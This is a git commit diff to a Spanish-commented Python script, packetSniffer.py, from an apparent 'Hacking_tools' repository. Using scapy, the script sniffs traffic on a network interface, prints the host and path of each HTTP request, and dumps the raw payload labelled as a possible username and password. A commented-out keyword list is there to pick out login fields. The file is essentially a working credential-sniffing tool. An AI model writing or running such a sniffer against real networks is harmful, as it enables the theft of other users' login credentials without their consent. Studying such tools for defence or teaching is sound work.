0f35b89e448b16c922bca1dfbe7251801f583333
Fegamon <fegamon1999@gmail.com>
2022-01-23 23:37:07 -0500

    pequeñas correciones

--- Hacking_tools/packetSniffer.py
+++ Hacking_tools/packetSniffer.py
@@ -1,12 +1,26 @@
+from ast import keyword
 import scapy.all as scapy
 from scapy.layers import http
 
-
+#Recibe los paguetes de los dispositivos conectados a la red
 def sniff(interface):
     scapy.sniff(iface= interface, store= False, prn= processSniffedPacket)
 
 def processSniffedPacket(packet):
-    if packet.haslayer(http.HTTPRequest) & packet.haslayer(scapy.Raw):
-        print(packet.show())
+    #Imprime los packetes de la capa HTTP y en la capa Raw de scapy que es donde se capturan los datos del login
+    if packet.haslayer(http.HTTPRequest):
+        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+        print(f'HTTP Request >> {url}')
+
+        #Sólo imprimirá los datos de la capa Raw de Scapy que es donde se almacenan los datos de inicio de sesión
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            #keywords = ['username', 'user', 'login', 'password', 'pass']
+            print(f'\n\nUsuario y contraseña posible >> {load}\n\n')
+
+            '''for i in keywords:
+                if i in load:
+                    print(load)
+                    break'''
 
 sniff('eth0')
